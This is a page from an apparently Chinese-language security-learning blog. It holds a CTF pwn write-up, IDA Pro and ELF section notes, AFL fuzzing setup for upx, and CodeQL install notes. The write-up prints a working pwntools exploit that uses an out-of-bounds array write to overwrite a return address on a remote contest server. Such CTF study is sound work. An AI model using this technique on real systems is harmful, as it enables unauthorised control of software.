<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.2/css/all.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"xiaosolll.github.io","root":"/","images":"/images","scheme":"Muse","version":"8.2.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
  </script>
<meta property="og:type" content="website">
<meta property="og:title" content="Antinomy">
<meta property="og:url" content="https://xiaosolll.github.io/page/2/index.html">
<meta property="og:site_name" content="Antinomy">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="eetan">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://xiaosolll.github.io/page/2/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>
<title>Antinomy</title>
  




  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Antinomy</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">eetan</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">24</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/05/02/ISCC-pwn-NUM-wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/05/02/ISCC-pwn-NUM-wp/" class="post-title-link" itemprop="url">ISCC-pwn-NUM-wp</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-05-02 13:06:57 / Modified: 13:45:47" itemprop="dateCreated datePublished" datetime="2021-05-02T13:06:57+08:00">2021-05-02</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="NUM-wp"><a href="#NUM-wp" class="headerlink" title="NUM -wp"></a>NUM -wp</h1><p>学习到的知识点：</p>
<blockquote>
<p>IDA宏定义</p>
<p>IDA中改bug</p>
<p>数组、switch的伪代码分析</p>
</blockquote>
<h2 id="反汇编失败–参数不匹配"><a href="#反汇编失败–参数不匹配" class="headerlink" title="反汇编失败–参数不匹配"></a>反汇编失败–参数不匹配</h2><p><img src="https://i.imgur.com/kdQWRCR.png"></p>
<p>从汇编代码中可以看见scanf的参数是四个，而反汇编那里出来的参数多于四个。    </p>
<p><img src="https://i.imgur.com/6WpcZTZ.png"></p>
<p><img src="https://i.imgur.com/bU4r5I9.png"></p>
<p>在这里改为四个参数，将后面的参数全部删除。</p>
<p>按’y’键更改。</p>
<p><img src="https://i.imgur.com/QFPiGhV.png"></p>
<h2 id="读反汇编出的c语言代码"><a href="#读反汇编出的c语言代码" class="headerlink" title="读反汇编出的c语言代码"></a>读反汇编出的c语言代码</h2><p><img src="https://i.imgur.com/2102GnB.png"></p>
<p>这是一个数组，首地址(&amp;v17),a2是数组的长度。</p>
<p><img src="https://i.imgur.com/ZduiP7i.png"></p>
<p>这也是一个char数组的循环赋值</p>
<h2 id="多层循环实际上是switch语句"><a href="#多层循环实际上是switch语句" class="headerlink" title="多层循环实际上是switch语句"></a>多层循环实际上是switch语句</h2><p>可以看到后面的输入输出语句都是对应着菜单。</p>
<p>漏洞点在输入为3. Change One?，没有对数字进行边界控制，也就是说当我们只有一个a[3]数组，我们可以更改到a[1024]甚至更多。里面的数字就是对应首地址的偏移地址。</p>
<p><img src="https://i.imgur.com/tE3n3UI.png"></p>
<p><strong>假如v17[a2]访问到这里的print函数，并且地址是ret返回地址。我们就获得了程序控制。</strong></p>
<p><img src="https://i.imgur.com/jBqLbfT.png"></p>
<h2 id="数组的首地址"><a href="#数组的首地址" class="headerlink" title="数组的首地址"></a>数组的首地址</h2><p><img src="https://i.imgur.com/56laxlH.png"></p>
<p><img src="https://i.imgur.com/Uoe6NQ2.png"></p>
<p>这里创建输入数组数据</p>
<p>在gdb中输入1  1来看是否是数组的首地址。</p>
<p><img src="https://i.imgur.com/Ut7Z0eA.png"></p>
<p>在黄色高亮处gdb下断点。</p>
<p><img src="https://i.imgur.com/o8mouXN.png"></p>
<p>可以看到EDX是0x1也就是我们输入进去的1</p>
<p><img src="https://i.imgur.com/j9lxOiR.png"></p>
<h2 id="分析一下scanf-函数"><a href="#分析一下scanf-函数" class="headerlink" title="分析一下scanf()函数"></a>分析一下scanf()函数</h2><p><img src="https://i.imgur.com/8Ep6fUf.png"></p>
<p>从汇编中可以看到程序通过<strong>scanf</strong>将数据存储到栈中，然后通过<strong>eax和ecx</strong>将数据存储到<strong>eax</strong>中存放的地址中去（cl是ecx的低位）</p>
<p>那意味着在程序运行到<strong>0x08049321</strong>的位置时，此时eax中存放的即时数组的首地址。</p>
<p><img src="https://i.imgur.com/q07EHg5.png"></p>
<h2 id="找到数组和ret之间的偏移"><a href="#找到数组和ret之间的偏移" class="headerlink" title="找到数组和ret之间的偏移"></a>找到数组和ret之间的偏移</h2><p>数组首地址可以从gdb中知道，也就是eax的值。</p>
<blockquote>
<p>0xffffcf38 数组首地址</p>
</blockquote>
<p>而ret的值可以通过不断执行到ret，再查看esp的值从而得知。</p>
<blockquote>
<p>0xffffcfbc  返回地址</p>
</blockquote>
<p>之间的差值是0x84，也就是说数组的首地址再偏移0x84就到了ret的第一个字节。</p>
<p>于是wp如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">process_name &#x3D; &#39;.&#x2F;NUM&#39;</span><br><span class="line">    # p &#x3D; process(process_name)</span><br><span class="line">p &#x3D; remote(&#39;39.96.88.40&#39;,7030)</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">hackhere &#x3D; [0xb2, 0x91, 0x04, 0x08]</span><br><span class="line">write_offset &#x3D; 0x84</span><br><span class="line">     </span><br><span class="line">def change_number(offset, value):</span><br><span class="line">  p.sendlineafter(&#39;5. Exit?&#39;, &#39;3&#39;)</span><br><span class="line">  p.sendlineafter(&#39;Change which?&#39;, str(offset))</span><br><span class="line">  p.sendlineafter(&#39;New NUM:&#39;, str(value))</span><br><span class="line">     </span><br><span class="line">p.sendlineafter(&#39;So, how many NUM?&#39;, &#39;1&#39;)</span><br><span class="line">p.sendlineafter(&#39;Send NUM&#39;, &#39;1&#39;)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">for i in range(4):</span><br><span class="line">  change_number(write_offset+i, hackhere[i])</span><br><span class="line">     </span><br><span class="line">p.sendlineafter(&#39;5. Exit?&#39;, &#39;5&#39;)</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<blockquote>
<p>注意缩进</p>
</blockquote>
<h2 id="仍有疑惑的点："><a href="#仍有疑惑的点：" class="headerlink" title="仍有疑惑的点："></a>仍有疑惑的点：</h2><blockquote>
<p>后面change的循环是怎么赋值的？</p>
<p>为什么用低一字节的dl传给[eax]?</p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/05/01/IDA-learn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/05/01/IDA-learn/" class="post-title-link" itemprop="url">IDA-learn</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-05-01 15:02:45" itemprop="dateCreated datePublished" datetime="2021-05-01T15:02:45+08:00">2021-05-01</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-08-02 19:26:41" itemprop="dateModified" datetime="2021-08-02T19:26:41+08:00">2021-08-02</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="IDA-PRO-权威指南学习笔记"><a href="#IDA-PRO-权威指南学习笔记" class="headerlink" title="IDA PRO 权威指南学习笔记"></a>IDA PRO 权威指南学习笔记</h1><h2 id="IDA数据显示窗口"><a href="#IDA数据显示窗口" class="headerlink" title="IDA数据显示窗口"></a>IDA数据显示窗口</h2><ul>
<li>大部分窗口都可以通过view&gt;open subviews菜单打开</li>
<li><strong>ESC</strong>在反汇编窗口与web浏览器的“<strong>后退</strong>”类似</li>
</ul>
<h3 id="反汇编窗口"><a href="#反汇编窗口" class="headerlink" title="反汇编窗口"></a>反汇编窗口</h3><h4 id="面向文本"><a href="#面向文本" class="headerlink" title="面向文本"></a>面向文本</h4><p><img src="https://i.imgur.com/gL0xYPH.png"></p>
<p><img src="https://i.imgur.com/iUk0hnD.png"></p>
<h4 id="基于图形"><a href="#基于图形" class="headerlink" title="基于图形"></a>基于图形</h4><p><img src="https://i.imgur.com/3TK0xGZ.png"></p>
<p><img src="https://i.imgur.com/dkSjIgZ.png"></p>
<h5 id="创建其他反汇编窗口"><a href="#创建其他反汇编窗口" class="headerlink" title="创建其他反汇编窗口"></a>创建其他反汇编窗口</h5><p>一个窗口图形一个窗口文本</p>
<p><img src="https://i.imgur.com/fshDQ5R.png"></p>
<h3 id="name窗口"><a href="#name窗口" class="headerlink" title="name窗口"></a>name窗口</h3><p>列举二进制文件所有全局名称</p>
<blockquote>
<p>名称：对一个程序虚拟地址的符号描述</p>
</blockquote>
<p><img src="https://i.imgur.com/4XO0d4o.png"></p>
<h4 id="常用前缀"><a href="#常用前缀" class="headerlink" title="常用前缀"></a>常用前缀</h4><p><img src="https://i.imgur.com/miDpina.png"></p>
<h2 id="节的含义"><a href="#节的含义" class="headerlink" title="节的含义"></a>节的含义</h2><p>.text: 该节中包含程序的指令代码;<br>.init: 该节包含进程初始化时要执行的程序指令;当程序开始运行时,系统会在进程进入主函数之前先执行这一个节中的指令代码;<br>.fini: 该节中包含进程终止时要执行的指令代码;当程序退出时,系统会执行这个节中的指令代码;<br>.bss : 该节中包含目标文件中未初始化的全局变量;一般情况下,可执行程序在开始执行时,系统会把这一段内容清零;但是在运行期间的.bss段是由系统动态初始化而成的,目标文件中的.bss节中并不包含任何内容,其长度为0,所以它的节类型为SHT_NOBITS;<br>.data:这两个节用于存放程序中已被初始化过的全局变量;在目标文件中,它们是要占用实际的存储空间的,这一点与.bss节不同；如果全局变量是整形，类似下图，则该全局变量的值是0x64（100）：.rodata:这两个节中包含程序中的只读数据，例如函数体内，只读的字符串会存储在该节中；<br>.dynamic: 该节中包含动态链接信息,并且可能有SHF_ALLOC和SHF_WRITE等属性;<br>.dynstr : 该节中包含用于动态链接的字符串,一般是那些与符号表相关的动态符号的名字;<br>.dynsym : 该节中包含动态链接符号表;<br>.got : 该节中包含全局偏移表(global offset table)，存放的是类似相对_GLOBAL_OFFSET_TABLE_的偏移；<br>.plt : 该节中包含函数链接表(program link table);<br>.hash : 该节中包含一张哈希表，用于动态段中查找动态符号；<br>.interp : 该节中包含ELF文件解析器的路径名;如果该节被包含在某个可装载的段中,那么该节的属性中应设置SHF_ALLOC标志位;<br>.strtab : 该节用于存放字符串,主要是那些符号表项的名字;如果一个目标文件中有一个可装载的段,并且其中含有符号表,则该节的属性中应该有SHF_ALLOC属性;<br>.symtab : 该节用于存放符号表;如果一个目标文件中有一个可装载的段,并且其中含有符号表,则该节的属性中应该有SHF_ALLOC属性;<br>.shstrtab: 该节是节名字表,含有所有其它节的名字;<br>.comment: 该节中包含版本控制信息;<br>.line : 该节中包含调试信息,包括哪些调试符号的行号,为程序指令码与源文件的行号建立联系;<br>.note : 该节中包含注释;<br>rel.dyn节的每个表项对应了除了外部过程调用的符号以外的所有重定位对象，<br>.rel.plt节的每个表项对应了所有外部过程调用符号的重定位信息。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/04/29/AFL-fuzz%20%E6%B5%8B%E8%AF%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/04/29/AFL-fuzz%20%E6%B5%8B%E8%AF%95/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-04-29 21:48:21" itemprop="dateCreated datePublished" datetime="2021-04-29T21:48:21+08:00">2021-04-29</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="AFL-fuzz-测试"><a href="#AFL-fuzz-测试" class="headerlink" title="AFL-fuzz 测试"></a>AFL-fuzz 测试</h1><p>下载源码</p>
<p><a target="_blank" rel="noopener" href="https://lcamtuf.coredump.cx/afl/">https://lcamtuf.coredump.cx/afl/</a></p>
<p>解压并安装:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$make</span></span><br><span class="line"><span class="variable">$sudo</span> make all</span><br></pre></td></tr></table></figure>


<h2 id="这里以fuzz-upx为例进行测试"><a href="#这里以fuzz-upx为例进行测试" class="headerlink" title="这里以fuzz upx为例进行测试"></a>这里以fuzz upx为例进行测试</h2><h3 id="编译upx"><a href="#编译upx" class="headerlink" title="编译upx"></a>编译upx</h3><ul>
<li>upx项目地址([<em><a target="_blank" rel="noopener" href="https://github.com/upx/upx">https://github.com/upx/upx</a></em>)</li>
<li>因为afl会对有源码的程序进行重新编译,因此需要修改upx的Makefile</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$git</span> <span class="built_in">clone</span> https://github.com/upx/upx.git</span><br><span class="line"><span class="variable">$cd</span> upx</span><br><span class="line"><span class="variable">$vim</span> Makefile</span><br><span class="line">CC = /usr/<span class="built_in">local</span>/bin/afl-gcc <span class="comment">#添加此句</span></span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cd</span> src</span><br><span class="line"><span class="variable">$vim</span> Makefile</span><br><span class="line">CXX    ?= /usr/<span class="built_in">local</span>/bin/afl-g++ <span class="comment">#将CXX改成afl-g++</span></span><br></pre></td></tr></table></figure>


<p>通过upx的文档,还需要安装三个库:</p>
<h4 id="安装lzma-sdk"><a href="#安装lzma-sdk" class="headerlink" title="安装lzma-sdk"></a>安装lzma-sdk</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$git</span> submodule update --init --recursive</span><br></pre></td></tr></table></figure>


<h4 id="安装ucl"><a href="#安装ucl" class="headerlink" title="安装ucl"></a>安装ucl</h4><ul>
<li><p>下载<a target="_blank" rel="noopener" href="http://www.oberhumer.com/opensource/ucl/#download">ucl</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.oberhumer.com/opensource/ucl/download/ucl-1.03.tar.gz</span><br></pre></td></tr></table></figure>
<blockquote>
<p>解压:tar -zxvf ucl-1.03.tar.gz</p>
</blockquote>
</li>
<li><p>编译:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cd</span> ucl-1.03</span><br><span class="line">$./configure</span><br><span class="line"><span class="variable">$make</span> </span><br><span class="line"><span class="variable">$sudo</span> make install</span><br></pre></td></tr></table></figure>


<blockquote>
<p>UCL编译错误</p>
<p>checking whether your compiler passes the ACC conformance test… FAILED<br>configure:<br>configure: Your compiler failed the ACC conformance test - for details see<br>configure: `config.log’. Please check that log file and consider sending<br>configure: a patch or bug-report to <a href="mailto:&#109;&#97;&#x72;&#107;&#x75;&#x73;&#x40;&#111;&#x62;&#x65;&#x72;&#x68;&#117;&#109;&#101;&#x72;&#x2e;&#99;&#111;&#x6d;">&#109;&#97;&#x72;&#107;&#x75;&#x73;&#x40;&#111;&#x62;&#x65;&#x72;&#x68;&#117;&#109;&#101;&#x72;&#x2e;&#99;&#111;&#x6d;</a>.<br>configure: Thanks for your support.<br>configure:<br>configure: error: ACC conformance test failed. Stop.</p>
</blockquote>
<blockquote>
<p>解决：./configure CPPFLAGS=”$CPPFLAGS -std=c90 -fPIC”</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$export</span> UPX_UCCLDIR=<span class="string">&quot;~/ucl-1.03&quot;</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<h4 id="安装zlib"><a href="#安装zlib" class="headerlink" title="安装zlib"></a>安装zlib</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$wget</span> http://pkgs.fedoraproject.org/repo/pkgs/zlib/zlib-1.2.11.tar.xz/sha512/b7f50ada138c7f93eb7eb1631efccd1d9f03a5e77b6c13c8b757017b2d462e19d2d3e01c50fad60a4ae1bc86d431f6f94c72c11ff410c25121e571953017cb67/zlib-1.2.11.tar.xz</span><br></pre></td></tr></table></figure>
<blockquote>
<p>解压：tar -xvf zlib-1.2.11.tar.xz</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cd</span> zlib-1.2.11/</span><br><span class="line">$./configure</span><br><span class="line"><span class="variable">$sudo</span> make install</span><br></pre></td></tr></table></figure>


<h4 id="编译upx-1"><a href="#编译upx-1" class="headerlink" title="编译upx"></a>编译upx</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cd</span> ~/upx</span><br><span class="line"><span class="variable">$make</span> all</span><br></pre></td></tr></table></figure>
<p>若没有报错,则编译成功</p>
<p>此时可在/src目录下找到upx.out文件</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/04/28/afl-fuzz-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/04/28/afl-fuzz-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">afl-fuzz-源码分析</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-04-28 18:13:06 / Modified: 21:46:49" itemprop="dateCreated datePublished" datetime="2021-04-28T18:13:06+08:00">2021-04-28</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="AFL-fuzz"><a href="#AFL-fuzz" class="headerlink" title="AFL-fuzz"></a>AFL-fuzz</h1><p>模糊测试不需要人过多的参与，也不像动态分析那样要求分析人员有丰富的知识。简单解释，它就是用大量的输入数据自动去执行程序，从而发现哪些输入能够使程序发生异常，进而分析可能存在的漏洞。</p>
<p>调试人员为程序提供一些输入，即最左侧的testcases，AFL加载后将其放入一个队列中。对于每一次迭代，AFL首先从队列中取出一个testcase，然后对它进行修剪，去除不必要的数据以提高运行效率；再然后对输入进行变异操作，变异的模式很多，可以产生很多新的testcase。对于这些新产生的输入，将它们送到目标程序运行，若能够产生新的执行路径或者导致程序崩溃，就把它再放到队列中。在整个过程中，程序崩溃会被记录下来，它可能代表一个潜藏的漏洞。</p>
<p>病毒分析、破解、内核、</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/04/27/codeql-learn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/04/27/codeql-learn/" class="post-title-link" itemprop="url">codeql_learn</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-04-27 14:44:41 / Modified: 21:48:57" itemprop="dateCreated datePublished" datetime="2021-04-27T14:44:41+08:00">2021-04-27</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="CodeQL"><a href="#CodeQL" class="headerlink" title="CodeQL"></a>CodeQL</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>CodeQL是一个语义代码分析引擎，它允许我们将代码视为数据进行查询。编写一个查询，找到一个漏洞的所有变种，永远消除它。</p>
<p>它的整体思路是把源代码转化成一个可查询的数据库，通过Extractor模块对源代码工程进行关键信息分析提取，构成一个关系数据库。但是他的数据库并没有使用现有的数据库计数，而是一套基于文件的自己的实现。</p>
<blockquote>
<p>区别在哪？</p>
</blockquote>
<h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><p>对于编译型语言,Extractor会监控编译过程，编译器每处理一个源代码文件，它都会收集源代码的相关信息，比如(语法信息–AST抽象语法树)、（语义信息–名称绑定、类型信息、运算操作等）、（控制流）、（数据流），同时也会复制一份源代码文件。</p>
<p>对于解释性语言，Extractor则直接分析源代码，得到类似的相关信息。</p>
<blockquote>
<p>解释性语言</p>
<p>编译型语言</p>
</blockquote>
<p>关键信息提取完成后，所有分析所需数据都导入到一个文件夹—CodeQL database（其中包括了源代码文件、关系数据、语言相关的 database schema（schema 定义了数据之间的相互关系）。）</p>
<h2 id="官方手册"><a href="#官方手册" class="headerlink" title="官方手册"></a>官方手册</h2><p><a target="_blank" rel="noopener" href="https://codeql.github.com/docs/codeql-cli/">https://codeql.github.com/docs/codeql-cli/</a></p>
<h2 id="安装CodeQL"><a href="#安装CodeQL" class="headerlink" title="安装CodeQL"></a>安装CodeQL</h2><p>1.下载分析程序：<a target="_blank" rel="noopener" href="https://github.com/github/codeql-cli-binaries/releases/latest/download/codeql.zip">https://github.com/github/codeql-cli-binaries/releases/latest/download/codeql.zip</a></p>
<p>2.下载相关库文件：<a target="_blank" rel="noopener" href="https://github.com/Semmle/ql">https://github.com/Semmle/ql</a></p>
<p>3.下载最新版的VScode，安装CodeQL扩展程序：<a target="_blank" rel="noopener" href="https://marketplace.visualstudio.com/items?itemName=GitHub.vscode-codeql">https://marketplace.visualstudio.com/items?itemName=GitHub.vscode-codeql</a></p>
<ul>
<li>到扩展中心配置相关参数</li>
</ul>
<p><img src="https://i.imgur.com/eUpyeiY.png"></p>
<p><img src="https://i.imgur.com/rPltxcs.png"></p>
